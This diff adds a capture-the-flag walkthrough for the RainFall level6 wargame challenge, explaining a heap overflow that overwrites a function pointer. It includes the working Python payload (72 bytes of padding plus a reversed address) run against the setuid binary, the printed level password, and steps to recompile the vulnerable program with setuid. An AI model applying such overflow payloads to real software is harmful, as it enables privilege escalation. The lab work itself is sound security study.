@@ -1,2 +1,54 @@
 level6@RainFall:/tmp$ ~/level6 $(python -c "print('A'*72+'\x08\x04\x84\x54'[::-1])")
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
+
+# We have a function calling the useless function m() stored in a heap buffer.
+
+# We want to overwrite the heap buffer so it contains a pointer to the useful function n() at address 0x08048454.
+
+# We call malloc(64) and then strcpy argv[1] into this area on the heap.
+
+# The function pointer is stored in a second malloc(4) area on the heap.
+
+# We can input a string long enough to be copied into the second malloc data block, overwriting the function pointer to call n().
+
+# From trial and error, we find the next malloc data starts 72 bytes later
+
+[ malloc data block ][ metadata ][ malloc data block ]
+[ 64 bytes          ][ 8 bytes  ][ 4 bytes           ]
+
+# Run the program
+~/level6 `python -c "print('A' * 72 + '\x08\x04\x84\x54'[::-1])"`
+
+# Now we can log in as user level7
+su level7
+# password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user level7:
+
+    # Compile the program in /tmp
+    gcc source6.c -o ft_level6
+
+    # Edit suid
+    chmod u+s ft_level6
+
+    # Move the program to home directory
+    chmod +wx ~; mv ft_level6 ~
+
+# As user level6:
+
+	# The function n() is at address 0x08048474
+
+	# Run the program
+	./ft_level6 `python -c "print('A' * 72 + '\x08\x04\x84\x74'[::-1])"`
+
+
+
